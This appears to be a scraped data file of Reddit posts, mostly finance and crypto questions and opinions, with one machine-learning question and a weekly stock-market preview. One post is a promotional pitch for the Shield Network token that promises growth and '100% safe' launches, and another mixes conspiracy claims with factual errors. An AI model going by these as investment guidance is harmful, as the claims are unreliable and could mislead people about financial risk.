60. LunarCrush interviewed Charles and he gave us some more details on the Ethiopia deal and Africa:  1) the IOHK office in Ethiopia is merging with the Singularity Net Office (it’ll be 30-50 people...so pretty large presence); 2) Africa special to be announced very soon; 3) they will be doing fintech &amp; govtech, 4) everything on the governance side is going to be upgraded across a wide swathe of African nation states in next ten years, 5) lots of possible use cases including supply chains in agritech, putting land on a ledger, voting, identity, reputation (i.e. credit), &amp; payment systems; 6) Africa is like investing in China in the 1980s; 7) the demographics of Africa make it a really easy call to direct investment there; 8) charles said “Ethiopia, in particular, is very special to us and WE HAVE ACTUALLY CLOSED SOME DEALS...we’ll talk about those at the Africa Special”; 9) there will be security token plays in Africa in the mid 2020s since there are no stock exchanges; and 10) there is a big unannounced partnership called “the DCF” with a brand name consultancy we will recognize.  Here’s the LunarCrush interview. All queued up to the exact spot for the Africa discussion--[https://youtu.be/GWpqNPdOf9E?t=3804](https://youtu.be/GWpqNPdOf9E?t=3804)

Notice that the “insurance” comes with caveats.  They were very transparent on that point and people should take notice. Is CardStarter good? Is it bad?  I have no idea.

dogecoin,USD has no max supply,"I'm just saying.

It's true. Fiat (at least as the u.s. fed is concerned) is printed at will. So the idea that any crypto is not viable because it doesn't have a max supply is kinda a strange argument. 

USD has been the world's dominant currency for quite a few decades (I don't care to be specific because if I name a number that's incorrect y'all are gonna jump on me).

The crypto community places such high value on the fact that such and such currency has a max supply.

Theoretically, the argument makes sense. A currency with a max supply should be more valuable..... eventually....

When you look at real life economics, the currency that has dominated the entire globe in recent history has no max supply. 

Value is a nebulous concept. When USD went off the gold standard... (ie based on some kind of max supply).. the US took over and dominated global economics. 

To be clear, I don't support most of the US's foreign or monetary policies (which are, of course, linked in very complex ways), but their (my) national currency is dominant. 

I would love if this were to change. US foreign policy is, in my opinion, still imperialist despite whatever they would say. 

So the question that I'm leading up to.... 

Why does the majority of the crypto community at large think that a coin without a max supply is non-viable when the current dominant world currency has no max supply?",cryptocurrency
Bitcoin,How the COVID19 crisis caused the Bitcoin price to explode,"The onset of the novel coronavirus, or COVID-19, has become the defining event of 2020 and 2021, affecting all walks of life as national authorities scramble to control the worldwide pandemic. The effect on financial markets has been dramatic and damaging. But, for cryptocurrencies, there is something of a silver lining.



#Is it possible that this rise in prices at a time when most other investment options look unprofitable is because Bitcoin is becoming a safe haven?

Bitcoin is far from becoming a safe haven like gold or silver, even though its current trajectory looks similar. These are monumental changes in the underlying and will only change if the Fiat system itself is under threat. There are various narratives surrounding Bitcoin, but the biggest one still remains the fact that most volumes are due to trading. Some would argue it is gambling of sorts, while some will see a move towards digital gold. The US FED &amp; government has been pumping in billions of dollars into the economy. As long as the dollar remains strong, it will be difficult for Bitcoin to replace that. However, I am a strong believer in the BTC Digital Gold notion and the way governments are indiscriminatly pumping Fiat, a Gold and BTC could play a crucial role - an international currency of sorts.


Coronavirus exposed the weakness of traditional financial instruments (USA printing 3 trillion dollars. Keep in mind, that at a peak the crypto market had a total of 2 trillion dollar market cap), however, crypto has proven surprisingly resilient. As a result, BTC and other cryptocurrencies have seen their investment values rise and enjoyed more attempts at their mainstream integration.


#About 20 per cent of all US dollars were created this year.

The Federal Reserve has printed unprecedented amounts of money to support the coronavirus-stricken economy. It has sparked debates about inflation and helped asset prices like cryptos soar.

[Almost a fifth of all us dollars were created this year](https://www.cityam.com/almost-a-fifth-of-all-us-dollars-were-created-this-year/)


#What is in store for Bitcoin, once the world economy slowly recovers?

Coronavirus has had a huge effect on the nascent industry of crypto currencies. We were already dealing with various issues, like regulations, liquidity. scams etc and this has just added to the list of worries. However new companies are building a lot of interesting products but there is still a lot of ambiguity surrounding Bitcoin even today. Though it can fairly be called a mainstream asset now, it is yet to be institutionalised. Governments all over the world need to take bold measures to regulate it and make it easier to BUY / SELL / HODL Bitcoin. Till that happens, the crypto industry will continue to struggle amid all the uncertainty, which has been further highlighted by Corona situation. Hopefully, few years down the line, the change in narrative will be more of a positive one.



#Conclusion
While it remains to be seen what the impact of future regulations and state digital assets will be, the COVID-19 crisis has proved one thing — cryptocurrency isn’t going away, and is in fact on track to become a more central part of the global economy than ever before.

CryptoCurrency,The importance of staking,"After discussing bank savings and crypto staking with a friend of mine, it was clear to see the importance of crypto for our own financial freedom in the future. We could, like most people, leave our money in a savings account in a bank. But what's the point? With the interest rates we were both offered (around 0.1%) we wouldnt even be allowing our hard earned money to combat inflation. We may as well stuff our money under a mattress and let it rot. But here, within the realm of crypto, the opportunities to earn are endless, ESPECIALLY long term. I dont think I've seen the APY of any single coin/token as low as the interest rate which my bank offered me. Want to buy some ADA which is an appreciating asset as things stand anyway? Of course I do. Want to earn some more of it while contributing to the crypto universe? Of course I do. Then stake your ADA and earn HUGE interest. My current APY on my staked ADA is around 8% and I'm sure some people here will be able to tell me of far higher rates on both ADA and other coins. Big bags or small, find a way of staking in a safe manner. The future is ours ladies and gentlemen!",cryptocurrency

personalfinance,Advice needed: older relative with credit card debt,"Hi all, I was recently granted POA for a relative who is 72. I was surprised to find they have $75k in credit card debt (and climbing), with $50k in cash in a bank account, and another $25k in a retirement account. They're on a fixed income ($1600/month from Social Security) and probably have no hope of paying this off as it stands. I will call credit card companies and try to negotiate lower interest rates and/or negotiate lower amounts to pay off to close the cards.

Their total monthly expenses right now are $4k (including debt service), which is obviously unsustainable. I'm working to cut these substantially, but I think the bare minimum will be about $2k outgoing a month. We'll see. It's worth mentioning that they rent, and have no physical assets worth selling.

1.) My instinct is to guard the cash as much as possible for unforeseen medical and other expenses. Is this wise? Is it possible (or advisable) to empty a 401k to pay off credit card debt?

2.) This relative is in relatively poor health. I don't know what the future holds, but it's clear they won't work again. How deleterious is it to carry this kind of debt in the medium-term or longer? Or, to use a tactless term, ""run out the clock"" on these debts? I understand how interest works, and how bad this will end up being.

Has anyone been in a similar situation like this? I appreciate any help. I don't want to let them down, but I also want to be realistic about what's possible at this point.",finance

I go in the IRS website and it doesn't show any messages for me or anything, I filed 2020 recently and same situation just got my state tax refund no news or movement from my federal return or stimulus checks.

Bitcoin,Please help me with these bitcoin questions!,"So i've been in crypto for a few months now and mainly get excited about alt's that I think have some amazing tech around them that I can see being used in the future. Bitcoin, for the time being ,I haven't dabbled in as there's a few questions that I can't wrap my head around - so I'm hoping you guys can help!

1. How does finance work with a finite resource? Like say for example you have only 10 bitcoin in circulation and you get a loan for all of them. It has a 20% interest rate so now you owe back 12 BTC... but there's only a maximum of 10; so where does the other 2 come from?
2. Although it's decentralised - it seems to be a centralisation for the rich. Like the ultimate goal from what I can see is for bitcoin to reach 1 million dollars, that then makes a satoshi equal value to about a cent as their worth 1 millionith of a bitcoin. So at the moment we have a bunch of us almost trying to buy the golden ticket to become a millionaire in the future, but then we have billions buying thousands of these for 50k a pop. If this hit a million, wouldn't this cause some rediciously weathly people and isn't that kind of a issue? If their a billionaire stock up on BTC now - in the future this could up their portifolio 200x making people trillionaires. Just seems odd.
3. And finally with such a limited supply how would poeple all over the world use it. Again take in all these whales stacking up coins, then the millions of bitcoin that is just lost in circulation already; how is there enough for everyone? Again influencing the above points it seems like you would have these ***conglomerates*** that have heaps, while others would never be able to get their hands on some.

There's probably a few other minor concerns I have like satoshi owning the biggest supply but has just gone rogue, and then mining needing something the size of greenland to be profitable but the above 3 points play on my mind the most and can't find answers anywhere else.",cryptocurrency

A few cycles of this and they could so thoroughly poop the field that nobody wants to play ball. Think they wouldn't stoop to such tactics? They do this with gold *constantly* and that's orders of magnitude more difficult to pull off.

It's not just the US trying to save the dollar. Crypto is a threat to all governments and private banking. What makes you so sure they're going to go down without a fight? It's obvious that their FUD is weak sauce for taking down the target.

MachineLearning,[D] Has anybody implemented FedAvg? I have a question,"Hello,

I am now implementing FedAvg using PyTorch.

Even after looking into some Github repositories, I am still confusing: testing models

My main question is:

(1) Should I prepare test dataset for each client?  
(i.e. each client has its own training/test dataset)

OR

should I use globally identical test set for all client?  
(since after finishing FedAvg, all the clients have the model with the same weights)

\---

(Detailed description)

I am now dealing with MNIST dataset with 10 clients.

Each client has only one digit: Client 0 has digit 0, Client 1 has digit 1, ... , Client 9 has digit 9.  
(for the simulation of non-IID setting)

After local training, each client sends parameters to the central server, the server then aggregates them, and finally re-distribute the averaged model to clients.

For testing the averaged model's performance, should I test only once using test dataset having all digits (the former case in the above question), or test 9 times using locally split test set (each having only one digit) and calculating mean to report the final performance?

\----

It is very confusing... If the latter is true, each client finally has the ability to encode the unobserved data (e.g. for Client 0 having only 0 digit sample, it is finally available to encode another digits (1-9) after FedAvg). Am I right?

Thank you in advance!",technology

Bitcoin,Could open-source crypto currencies like BTC be 'under attack' by the likes of the FEDERAL RESERVE and big investor banks? we should hold our positions and BUY more imo.,"Hey everyone, regarding the recent development of BTC, cryptocurrencies and governments, **i urge you** to read the following Due Diligence made my u/atobitt in the subreddit r/Superstonk

he has written a few extensive articles relating to the big banks and the biggest clearing house in the World, the **DTCC**. he makes a case on how the banks rule the world and in my opinion, how BTC an open source blockchain would change the game entirely to their demise. Please go have a read if you are curious to know why in my opinion, this might be on of the reason for the recent dips in the BTC price. read on, if you would like a quick overview of my thoughts, mind you, i am new to this, but read a lot of indept info the last few months.

Further more :

i believe with all the speculations by big investers like Warren Buffet, Jeremy Grantham and other billionaire investors, regarding a 'probable' financial disaster (just look it up on Youtube), and the Federal Bank unabashed money printing behaviour something is not right (obviously). The president's recent occurence and claims of a possible hike in tax rates spooked a lot of people. especially hearing him talk about even the unrealised gains being taxed! ofcourse this is 'outrageous', and i believe a way to frighten people. but what i found more interesting is how all of a sudden we hear about different billionaires including Frank Giustra, Bill Gates, Ray Dalio and others that BTC will not 'make it' or be allowed by the Federal Banks and governments.

Now i am new to the financial system, but i recently came to understand the power hungry, evil and greedy predatory behaviour of hedge funds including the recent scandal with Archevos Investments, and how they have been around for many decades. you can read their influence in our world in the book(s) of Susanne Trimbath : **""Naked, Short and Greedy: Wall Street's Failure to Deliver**"" or watch the docu movies :

The FED whom is supposed to regulate this, did nothing to change the situation.  u/atobitt wrote sevral incredibly indebt articles regarding this situation we are/have been - in.

and see for yourself the dynamics of our society, and why it might as i have come to understand be the mess that it is: inequality, poverty, wars, etc.

**Henry Ford** once said : *“It is well enough that people of the nation do not understand our banking and monetary system, for if they did, I believe there would be a revolution before tomorrow morning.”*

Taking this into account with the global health crisis and the disastreous enforcement of closing small businesses, i feel a greater scheme is going on. I am new to cryptocurrencies, however i came across news of the new FED Chairman, Gary Gensler. I read in the GME threads that this individual might be here for betterments of things. in some way i agree he might change things as he has been put in place previously, to help solve the mess post-2008 (?) however knowing his back ground i am skeptical too ; he worked for 18 years at JP Morgan (one of the big investment banks on Wall Street) and knows a lot about crypto currency. he even teached Crypto and Blockchain at MIT : [https://www.youtube.com/watch?v=EH6vE97qIP4](https://www.youtube.com/watch?v=EH6vE97qIP4)

I feel in my opinion,that the SEC is just the HR of the big banks, seeing how they were basically useless in solving the problems post 2008 and upto today, AND allowing more deregulations during the '90's of Wall Street (you can see this being explained in the above docu mentaries/movies.), creating the storm of fraud that caused millions of people their dreams and lives, some literally.

Coming to my point, i feel BTC is a game changer. It is Open Source and the governments around the World are trying to create their own Closed Source Crypto coins and masquerading it under the terms like pollution, problems with Climate Change (which i agree is a problem) watch this from Meet Kevin on youtube with Kevin O Leary from 54:15 [https://www.youtube.com/watch?v=FBuXIBeepC0](https://www.youtube.com/watch?v=FBuXIBeepC0) or trade Wars with China or getting 'Premiums' if you buy more and bring more people in. and ofcourse these 'opinions' by billionaires all of a sudden. I feel the Big Banks might and I say might want to turns things around in their favor as things are getting 'out of (their) control' and they need to create their OWN controlled crypto, and keep their power grip on people's money. Here is where imo the new SEC Chairman, Gary Gensler (a trusted all Street insider whom knows about the developments of Crypto) comes in. With all this going on, i just can not help but to think, just how the Open Source Crypto currencies like BTC and especially BTC could turns things around in the world's economy: more transparency, **ONE** 'currency', no more shenanigans and Cayman Islands's **multi trillion dollar money** laundering! I for one am an absolute PRO for BTC or any crypto coin that remains OPEN SOURCE. **if BTC might mean a revolution in the Financial World, then i know IT CAN ONLY GET BETTER.** This should just not be possible : [https://www.businessinsider.com/billionaires-net-worth-increases-coronavirus-pandemic-2020-7?r=US&amp;IR=T](https://www.businessinsider.com/billionaires-net-worth-increases-coronavirus-pandemic-2020-7?r=US&amp;IR=T)

i just want to serve humanity. i needed to get this of my chest. Open source Crypto currency is one important part of the way in my humble opinion. Thank you if you made it this far.",cryptocurrency

personalfinance,Im (23) buying Manufactured Home-First Time-Best Steps?,"Hey guys! Well im in the process of buying a home in a community with the purchase price of $130K. The price is a little steep which I assume is due to it being located in one of the nicest cities near me and because of the housing market nowadays.

Im still at the preclosing stage and now whats left is the appraisal, opening escrow, and the down payment to fund the loan (planning to put the 20% down). 
Ive read that these homes depreciate in value (built in 70s) so my question is: 

1. what if the appraisal comes back much lower than 130, will the loan fall through? 

 2. Say it comes back at 100, will we have to lose out in paying the extra 30 or are we open to renegotiation with the seller? Is it the best case for it to appraise for more? What im hoping will happen is it appraises for less and (since the seller knows one of my relatives) I can renegotiate to a lesser purchase price. They will also help with paying half in closing costs.


3. Also, the lender's interest rate is an atrocious  7% along with origination fees (4%~7k), would it make sense to put more money down and pay more in every payment to pay it off? Or just do the 20% and invest any saved money (7% annual returns projected)

4 Bonus question: Any advice on what you would do?
 Thanks!!

personalfinance,Saving for Daughter's Education,"My partner and I want to start saving for college for her daughter (13). She makes \~50k/yr and I am currently making \~220k/yr. We are not currently married. Therefore, by all legal definitions, my partner is a single mother, so I have little concern that her daughter will qualify for the federal pell grant, as well as possibly for other federal/state grants for children from single-parent households, ""ethnicity"" scholarships because she was born in Japan, as well as other ""normal"" scholarships. 

My partner wants to get married (and so do I, just not until she graduates college). I think extremely logically, and financially, so I'm concerned that her daughter will lose a significant amount of government-funded aid and that burden will fall on us/student loans if we do. 

I come from a low-income family, received the Pell grant as well as several other scholarships/gifts from grandparents/0% interest student loans (through scholarship). In short, I left college with 11k in student loans which I paid off in 2 years. 

I'm hoping to get any thoughts/opinions from anyone else in a similar situation as me, or from someone who can provide me a completely different perspective that I haven't considered.",finance
personalfinance,What’s next for me?,"Robinhood or ROTH Ira... What’s next?

Note when I say Robinhood I mean really any investing app... I’m somewhat aware of the stuff that happened with Robinhood in the past and am looking into researching other investing apps to substitute, but right now I am just gonna refer to the investing app decision as Robinhood since I’m most familiar with that app. 

Some background on me: 

- I make about $34,000 a year before taxes as a Teller Manager at a bank. I am aware my income is low and obviously that is something I want to work on first to get that to at least above $40,000 but I will work with what I got right now. 

- I am 24 and still live at home with my parents. I pay rent ($500 a month which is better than anything I could do on my own). This will likely change after I start driving. 

- I do not drive therefore I do not own a car due to traumas I went through as a young teenager that made me scared to drive. This will likely change in the coming months as I am finally beginning to learn. So no car payments. 

- Never went to college, so no student debts. 

- I have two credit cards that I use and pay off in full every month. 

- All of these factors have allowed me to save about $20,000 in cash in an almost non existent bank savings account in the almost 6 years I have been working (I started at 18 out of high school at 18,000 a year and worked my way up). 

I have all of this cash and I feel like I can be doing way more with my savings... now, I am planning on moving out and getting a car within the next year or year and a half at most. So I want to keep the 20k where it is so it’s there when I will inevitably need it. However, I want to keep continue saving. I just don’t want to put it in my savings account where it will be doing nothing. 

I began using Acorns and contribute 35 dollars a week and every once in a while put in a one time deposit of $100 but I usually just let it do it’s thing on its own. I also use round ups and it’s at about $1500 after 6 months of using it. I enjoy it but I feel like it’s too automated and I want to get involved more with my money. 

That’s where my question comes in. Because I will have some big expenses coming up in the future, I’m not sure what to do. My boss suggested I open up a ROTH IRA and contribute my future savings into that, however I wanted something more liquid as from my understanding you cannot pull from the IRA without a big penalty before the age of maturity. Being tax free is nice, but I’m not sure it’s a good idea right now for someone in my situation. 

On the flip side I was thinking of just putting my usual $700 a month in an investing app like Robinhood and letting it accumulate from there. A friend of mine suggested EFTs to start because they are relatively safe and sort of a package deal when it comes to stocks which is good for a beginner like me. 

The final option would to be just keep contributing to my savings account and not do any of this stuff until I either make more money or I don’t have big purchases coming up in the next couple of years, but this is something I want to try to avoid because my interest rate on this account is 0.01%... I feel like it’s a waste :( 

Any help would be appreciated!! Apologies in advance for the rambling and probably stupid questions... they don’t teach you this stuff in school and I’m not very educated on what is better. 

If anyone suggests the investment app route please direct me to ones that aren’t Robinhood so I don’t make a poor choice in where I put my funds.",finance

**🛡 ANNOUNCEMENT OF DAILY DEVELOPMENTS 🛡**

**The** [**Shield Network**](https://www.shieldnetwork.io/) **($SHILD) token has grown its Telegram community to over 6000+ members with 13,000+ wallet holders within only 8 days of launch! With a well-defined token utility, responsive team of developers/admins, and dedicated marketing plan, this project has seen inspiring growth. The project has everything in the making to become one of the most valuable Binance Smart Chain projects ever!**

**We are listed at coingecko, and cmc we will come next week.. Better to be in before thats** [**CoinGecko**](https://www.coingecko.com/en/coins/shield-network) **with a listing on CoinMarketCap expected in the near future. Despite not being listed on any of the major cryptocurrency websites, the project and its investors have already grown the market cap to $10M in a matter of days. It goes without saying that we may observe unprecedented growth with future listings! Additionally, TrustWallet now lists the $SHILD token logo and price, which will make it even easier for investors to track the project's growth.** 

**Expanding on the Shield Network team's recognition of the need and value of transparency, the team has published a** [**Telegram survey**](https://www.surveymonkey.com/r/MRLWFHV)  **leading up to its first formal AMA this week (time TBD). As always, the team will be happy to discuss questions from both community members and prospective investors. The overarching goal is to always make the community feel comfortable and informed of any and all project details. In addition, the Shield Network team will be taking applications for those with professional skill sets (graphic design, videography, coding, public speaking, etc.) who are interested in becoming more active community and team members. With 17+ members already on the team, it is evident that the group is driven and substantial enough to keep progressing the project in all avenues!**

**As with any new token, the team encourages prospective investors to do their own research, learn more below, and only invest when you're comfortable doing so!**

\-----------------------------------------------

**What is the Shield Network project?**

Shield Network is an upcoming project created on the Binance Smart Chain (BSC), aspiring to create a safer cryptocurrency market for everyone. The project token ($SHILD) is a deflationary currency with a 2% tax on every transaction – 1% is removed or “burned” from supply and 1% is redistributed amongst current holders. As with all deflationary tokens, the Shield Network token can only increase in rarity. Perhaps even rarer, the Shield Network has a central goal that extends past creating a token just like the rest.

Shield Network strives to become the principal token-auditing platform in which every token is meticulously and methodically audited to expose scam projects, guarantee safety to investors, and instill confidence in the market as a whole.

The Shield Network team has recognized the need and value of transparency, which led to a recent release of a [complete TechRate smart contract audit of the Shield Network token](https://www.shieldnetwork.io/wp-content/uploads/2021/04/Shield-Network-Full-Smart-Contract-Security-Audit.pdf). Moreover, the team is finalizing negotiations with Certik, the gold standard for market audits, to complete a follow-on audit sometime in May. The development team openly polled the community before committing to the Certik audit and the corresponding funds required from the developer wallet.

&amp;#x200B;

**Who is the team behind the project? What is their vision?**

The Shield Network is a dedicated team consisting of 6 developers from Norway with several others serving in a moderating capacity. Their vision is to make the cryptocurrency market a safer place for all investors.

With the mainstream adoption of cryptocurrency, the market has been flooded with new investors who often invest with limited or non-existent knowledge of the proliferation of scam, “rug-pull”, or “pump-and-dump” projects. The number of these exploitative projects has grown exponentially and will continue to do so as the market expands. Failure to vet such projects would lead to a detrimental risk to new investors that would damage the perception of the cryptocurrency market.

Shield Network foresees scam projects as a problem that will never go away, but one that can be mitigated. That is why Shield Network will be creating the first pre-launch token auditing platform that will give investors the ability to invest their money in new projects with confidence and assurance.

In addition to building a pre-audited launch platform, the project will seek to focus on establishing and helping the community. Their intent is to provide investors with advice on how to trade and invest in a safe manner, minimize risk and losses, and ultimately, maximize gains. The team believes this to be much needed in the cryptocurrency space and hopes that their efforts will create a positive impact throughout the cryptocurrency community.

Team doxxing remains a worthwhile concern from prospective investors, and the team has committed to doing so sometime in the future once everyone is in agreement and they're comfortable doing so on both a personal and professional level.

&amp;#x200B;

**How will the Shield Network auditing platform function?**

The Shield Network auditing platform consists of a three-tiered launchpad system:

*Tier 1 – Security Launch*

* All token projects launched in Tier 1 are guaranteed by Shield to be 100% safe.
* Projects will be required to have their lead developer undergo KYC verification to Shield.
* Projects will be audited and deployed by Shield.
* Projects will have development funds held by Shield.
* Shield will provide 24/7 developer support and a marketing manager for project launches
* *Tier 1 projects will only be accessible to new investors who hold a minimum (to be determined) number of Shield Network tokens.*

*Tier 2 – Audited Launch*

* All token projects launched in Tier 2 are meticulously and methodically audited by Shield.
* Projects will be required to have their lead developer undergo KYC verification to Shield.
* Project audits will ensure that the contract is safe and the tokenomics work as marketed.
* Projects will have time-locked development funds to prevent “liquidity stripping”.
* *Tier 2 projects will only be accessible to new investors who hold a minimum (to be determined) number of Shield Network tokens.*

*Tier 3 – Decentralized Launch*

* All token projects launched in Tier 3 are completely decentralized. Shield recommends that potential investors do their own research before investing.
* Projects will have 50% of listing fees used for Shield Network development and 50% of listing fees used for buying and burning Shield Network tokens.
* *Tier 3 projects are open to all new investors with no minimum required holding of Shield Network tokens.*

&amp;#x200B;

**What is the Shield Network tokenomics?**

The Shield Network tokenomics are characterized by three features:

* Auto Burn – 1% of Shield tokens in each transaction are “burned” or removed from circulating supply forever.
* Frictionless Staking – 1% of Shield Tokens in each transaction are redistributed amongst holders.
* Automatic Liquidity Pool (LP) – Every trade automatically contributes toward generating liquidity locked inside the Pancake Swap LP.

Tokenomic Breakdown:

* Total Supply = 1 Trillion
* Burned on Minting = 33%
* DxLocked = 47%
* Presale Tokens = 20%
   * 80% of the presale supply will be added to the liquidity pool and locked by DxSale for 5 years.
   * 20% of the presale supply will be used for marketing and expansion.

&amp;#x200B;

**What’s on this year’s roadmap for Shield Network?**

**Q2**

* Shield Network Launch
* Listing on Pancake Swap
* Website and Social Media Accounts
* Marketing Campaign

stocks,"Wall Street Week Ahead for the trading week beginning April 26th, 2021","Good Saturday afternoon to all of you here on r/stocks. I hope everyone on this sub made out pretty nicely in the market this past week, and is ready for the new trading week ahead.

Here is everything you need to know to get you ready for the trading week beginning April 26th, 2021.

# **Taxes and inflation will be key themes for markets in the week ahead - [(Source)](https://www.cnbc.com/2021/04/23/taxes-and-inflation-will-be-key-themes-for-markets-in-the-week-ahead.html)**
*****
&gt; The final week of April is going to be a busy one for markets with a Federal Reserve meeting and a deluge of earnings news.
*****
&gt; Hot topics in markets will continue to be inflation and taxes.
*****
&gt; President Joe Biden is expected to detail his “American Families Plan” and the tax increases to pay for it, including a much higher capital gains tax for the wealthy. The plan is the second part of his Build Back Better agenda and will include new spending proposals aimed at helping families. The president addresses a joint session of Congress Wednesday evening.
*****
&gt; It’s a huge week for earnings with about a third of the S&amp;P 500 reporting, including Big Tech names, such as Apple, Microsoft, Alphabet and Amazon.
*****
&gt; As many have already done, firms like Boeing, Ford, Caterpillar and McDonald’s, are likely to detail cost pressures they are facing from rising materials and transportation costs and supply chain disruptions.
*****
&gt; At the same time, the Fed is expected to defend its policy of letting inflation run hot, while assuring markets it sees the pick-up in prices as only temporary. The central bank meets on Tuesday and Wednesday.
*****
&gt; # The central bank takes the main stage
&gt; “I think the Fed would like not to be a feature next week, but the Fed will be forced from the background because of concerns about inflation,” said Diane Swonk, chief economist at Grant Thornton.
*****
&gt; The central bank is not expected to make any policy moves, but Fed Chairman Jerome Powell’s press briefing following the meeting Wednesday will be closely watched.
*****
&gt; So far, the barrage of earnings news has been positive, with 86% of companies reporting earnings beats. Corporate profits are expected to be up about 33.9% for the first quarter, based on estimates and actual reports, according to Refinitiv. Revenues are about 9.9% higher.
*****
&gt; There is important inflation data Friday when the Fed’s preferred inflation gauge is reported.
*****
&gt; The personal consumption expenditure report is expected to show a 1.8% rise in core inflation, still below the Fed’s target of 2%. Other data releases include the first-quarter gross domestic product on Thursday, which is expected to have grown by 6.5%, according to Dow Jones.
*****
&gt; “I think the Fed has no urgency to shift monetary policy at this point,” said Ian Lyngen, head of U.S. rates strategy at BMO. “The Fed needs to acknowledge that the data is improving. We had a strong first quarter.”
*****
&gt; “The Fed needs to acknowledge that but at the same time they’re keeping extremely accommodative policy in place, so they’ll have to make a note to the fact that the easy policy is warranted,” he said.
*****
&gt; Lyngen said the Fed will likely point to continued concerns about the pandemic globally as a potential risk to the economic recovery.
*****
&gt; Powell is also expected to once more explain that the Fed will let inflation rise above its 2% target for a period of time before it raises rates so that the economy can have more time to heal. “It’s going to be a challenge for the Fed,” said Swonk.
*****
&gt; The base effects for the next several months will make inflation appear to have jumped sharply because of the comparison to a weak period last year. The consumer price index for April could be above 3%, compared to 2.6% last month, Swonk added.
*****
&gt; “The Fed is trying to let a lot more people get out onto the dance floor before it calls ‘last call,’” she said. “Really what Powell has been saying since day one is if we take care of people on the margins and bring them back into the labor force, the rest will take care of itself.”
*****
&gt; Stocks were slightly lower in the past week, and Treasury yields held at lower levels. The 10-year yield, which moves opposite price, was at 1.55% Friday.
*****
&gt; The S&amp;P 500 was down 0.1%, ending the week at 4,180, while Nasdaq Composite was down nearly 0.3% at 14,016. The Dow was off just shy of 0.5% at 34,043.
*****
&gt; # Tax hike prospects
&gt; Stocks were hit hard on Thursday when after a news report said that Biden is expected to propose a capital gains tax rate of 39.6% for people earning more than $1 million a year.
*****
&gt; Combined with the 3.8% net investment income tax, the new levy would more than double the long term capital gains rate of 20% or the richest Americans.
*****
&gt; Strategists said Biden is expected to propose raising the income tax rate for those earning more than $400,000.
*****
&gt; “I think a lot of people are starting to price in the risk there going to be a significant increase in both corporate and capital gains taxes,” said Lyngen.
*****
&gt; So far, companies have not provided much in the way of commentary on the proposed hike in corporate taxes to 28% from 21% but they have been talking about other costs.
*****
&gt; David Bianco, chief investment strategist for the Americas at DWS, said he expects larger companies will do better dealing with supply chain constraints than smaller ones. Big Tech is also likely to fare better during the semiconductor shortage than auto makers, which have already announced production shutdowns, he said.
*****
&gt; “Next week is tech week. I think we’re going to get down on our knees and just be in awe of their business models and their ability to grow at a behemoth scale,” Bianco said.
*****
&gt; He said he’s not in favor of Wall Street’s popular trade into cyclicals and out of growth. He still favors growth.
*****
&gt; “We’re overweight equities really because we’re concerned about rising interest rates,” Bianco said. “I’m not bullish in that I expect the market to rise that much from here.”
*****
&gt; “We stuck with growth and dug deeper into bond substitutes, utilities, staples, real estate,” he said, adding he is underweight industrials, energy and materials. “Energy is doomed. It’s being nationalized via regulation. I do like industrials, they are well-run companies, but I do think infrastructure spending expectations for classic infrastructure are too high.”
*****
&gt; He also said industrials are good businesses, but the stocks have become overvalued.
*****
&gt; Bianco said he likes big box stores, but smaller retailers are facing big challenges that were already impacting them prior to Covid. He also finds small biotech firms attractive.
*****
&gt; “I like healthcare stocks. Those valuations are reasonable. People have been paranoid about politicians beating on them since 1992. They manage through it and lately they’ve been delivering,” he said.

&gt; # Next Bump in Post-Election Year Rally Could Be in May

&gt; As of yesterday’s close, DJIA was up 10.5% year-to-date. S&amp;P 500 was up 10.1% and NASDAQ was at 7.0%. Compared to average post-election year historical performance since 1950 graphed in the charts above and below, DJIA, S&amp;P 500 and NASDAQ are all still comfortably above past post-election year average performance for this point of the year.

&gt; Due to Covid-19, 2021 so far has been more volatile than the average post-election year. Aside from larger magnitude swings in performance, we have observed the return of seasonality with choppiness in February and weakness in March following monthly options expiration. Strength this April is also aligning with historical in post-election year April strength.

&gt; Historically, the next area of potential concern for the current rally is just after mid-May. This is also right around the time Q1 earnings season is beginning to wrap and focus shifts to Q2 estimates, graduations, and other early summer activities.

&gt; # Leading Indicators Suggest an Accelerating U.S. Economy

&gt; The economic reacceleration is underway in the U.S., as the expanding vaccination campaign, lifting of mobility restrictions, and infusion of fiscal stimulus combined to lift the Conference Board’s Leading Economic Index (LEI) in March. The LEI grew 1.3% month over month, ahead of Bloomberg consensus forecasts of 1%, raising the Conference Board’s gross domestic product (GDP) expectations to 6% on a year-over-year basis.

&gt; After a weaker-than-expected February release that was primarily disrupted by the winter storm, data in March snapped back in a strong fashion. All ten components of the LEI rose in March, while jobless claims were the largest contributor to the growth of the index. Labor market data has continued to improve since the measurement period, as weekly jobless claims have posted back-to-back pandemic lows. The ISM New Orders Index was the second largest contributor to the LEI, which climbed to its highest levels since 2004.

&gt; The Conference Board revised the February data lower, however, snapping what was a 10-month streak of growth for the index. As shown in the LPL Chart of the Day, the LEI is back on the rise, suggesting further economic momentum in the coming months:

&gt; “Momentum breeds momentum, and we expect the U.S. economy will continue to improve in the coming months as we move forward with reopening plans,” noted LPL Financial Chief Market Strategist Ryan Detrick. “As the rest of the world continues to improve as well, we expect some spill-over effects to also benefit the US economy.”

&gt; The U.S. is currently vaccinating around 3 million people per day, according to the Center for Disease Control (CDC), and over half of the adult population has received at least one dose of the vaccine. Meanwhile, over 80% of the population above the age of 65—the most at-risk age segment of the population—has received at least one dose of the vaccine. The improving vaccination data has helped embolden policymakers to lift restrictions, and prompted us to upgrade our GDP forecast for the U.S. to 6.25-6.75% in our recent Weekly Market Commentary.

&gt; # What Happens After The First Rate Hike?

&gt; “Don’t fight the Fed.” Old investment saying

&gt; One of the popular questions we’ve received lately is what do stocks do after the first rate hike? Let’s be clear, we think the Federal Reserve Bank (Fed) will leave rates low until at least 2023, but what if we get a sudden dose of inflation? This isn’t our base case, but a rate hike could potentially happen sooner in that situation.

&gt; After all, the first rate hike in 2015 set off a huge sell-off into early February 2016, as the market was quite upset and let it be known that it felt the Fed acted too soon. In fact, the first hikes of 2004 and 1999 also saw losses the first three months after the first hike, but eventually stocks were in the green a year later.

&gt; “The first hike in recent cycles has indeed brought with it some selling pressure, but hikes usually take place in strong economies, so it isn’t surprising to see returns turn green once you go further out,” explained LPL Financial Chief Market Strategist Ryan Detrick. “But let’s not sound any alarms yet, we don’t see a rate hike for a couple of years. Still, it’s good to know what the playbook could be once it happens.”

&gt; As shown in the LPL Chart of the Day, that initial rate hike can cause some hiccups the first three months, but returns turn much better 6- and 12-months later.

&gt; # Twin Deficits and the US Dollar

